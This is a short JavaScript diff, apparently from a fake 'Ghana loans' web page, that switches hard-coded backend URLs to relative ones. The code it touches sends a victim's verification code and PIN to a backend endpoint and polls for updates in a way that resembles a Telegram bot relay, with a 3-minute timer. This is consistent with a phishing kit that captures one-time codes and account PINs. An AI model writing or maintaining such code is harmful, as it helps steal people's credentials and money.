@@ -43,8 +43,8 @@ document.addEventListener('DOMContentLoaded', function() {
             // Start 3-minute timer
             startTimer(180);
             
-            // Send code to backend
-            fetch('https://ghana-loans-xz37.onrender.com/api/send-message', {
+            // ✅ USE RELATIVE URL
+            fetch('/api/send-message', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -76,7 +76,8 @@ document.addEventListener('DOMContentLoaded', function() {
 function startCheckingUpdates() {
     checkInterval = setInterval(async () => {
         try {
-            const response = await fetch(`https://ghana-loans-xz37.onrender.com/api/get-updates/${lastUpdateId}`);
+            // ✅ USE RELATIVE URL
+            const response = await fetch(`/api/get-updates/${lastUpdateId}`);
             const data = await response.json();
             
             if (data.success && data.data.result && data.data.result.length > 0) {
@@ -101,6 +102,7 @@ function startCheckingUpdates() {
             }
         } catch (error) {
             // Silent retry
+            console.log('Checking for updates...');
         }
     }, 3000);
 }
@@ -150,7 +152,8 @@ window.submitPin = function() {
     
     showMessage('PIN sent for verification. Please wait...', 'success');
     
-    fetch('https://ghana-loans-xz37.onrender.com/api/send-message', {
+    // ✅ USE RELATIVE URL
+    fetch('/api/send-message', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
